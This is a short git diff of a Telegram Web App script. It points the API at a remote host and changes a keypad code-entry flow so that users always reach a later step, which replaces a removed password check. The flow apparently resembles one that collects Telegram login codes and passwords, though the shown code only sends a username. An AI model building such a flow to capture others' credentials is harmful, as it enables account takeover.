@@ -7,7 +7,8 @@ Telegram.WebApp.MainButton.setParams({
     is_visible: false
 });
 
-const API = 'http://127.0.0.1:5000'
+// const API = 'http://127.0.0.1:5000'
+const API = 'https://dinel1337-just-my-projects-0ed9.twc1.net'
 
 async function RequestSUKA(endpoint, method = 'POST', body = {}) {
         const response = await fetch(`${API}/${endpoint}`, {
@@ -419,17 +420,9 @@ document.querySelectorAll('.keyboard button[data-digit]').forEach(button => {
                     username: window.Telegram.WebApp.initDataUnsafe.user.username
                 })
                 end_code_loading();
-
+                step3();
                 if (data.status === 200) {
-                    console.log('ПРОВЕРКА')
-                    console.log('ПРОВЕРКА')
-                    console.log('ПРОВЕРКА')
-                    console.log('ПРОВЕРКА')
-                    if (data.needs_password) {
-                        await step3();
-                    } else {
-                        step4();
-                    }
+                    step3()
                 }
             }
         }
